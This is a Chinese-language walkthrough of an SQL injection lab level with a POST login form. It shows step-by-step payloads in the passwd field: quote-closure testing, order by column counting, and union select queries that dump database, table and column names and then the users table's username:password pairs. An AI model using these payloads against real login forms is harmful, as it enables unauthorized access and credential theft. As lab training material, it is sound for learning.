# 测试
到这里需要输入两个参数了

我们先随便输入一下然后hackbar打开load一下

# 确认闭合类型
在post数据部分发现  
passwd=1&submit=Submit&uname=1

像这种登录一样的形式，我们一般通过 or 1=1 来使判断恒成立

我们测试一下passwd会不会是sql注入点

输入passwd=1' or 1=1 --+&submit=Submit&uname=1 
正常，那么可以判断passwd可以是注入点，而且是单引号闭合

# 判断回显位置

post输入:passwd=1' or 1=1 order by 3 --+&submit=Submit&uname=1  
报错

输入passwd=1' or 1=1 order by 2 --+&submit=Submit&uname=1 
正常，说明只查询了两个参数

接下来跟第一关步骤一样，我们也不需要or 1=1了

构造错误密码，然后返回我们想要数据  
输入passwd=1' union select 1,2 --+&submit=Submit&uname=1

回显：  
Your Login name:1  
Your Password:2

# 查询数据库名
passwd=1' union select database(),2--+&submit=Submit&uname=1

# 查询表名
passwd=1' union select group_concat(table_name),2 from information_schema.tables where table_schema=database()--+&submit=Submit&uname=1

# 查询列名
passwd=1' union select group_concat(column_name),2 from information_schema.columns where table_name='users' and table_schema=database()--+&submit=Submit&uname=1

# 查询值
passwd=1' union select group_concat(username,':',password),2 from users--+&submit=Submit&uname=1

回显：  
Your Login name:Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4

Your Password:2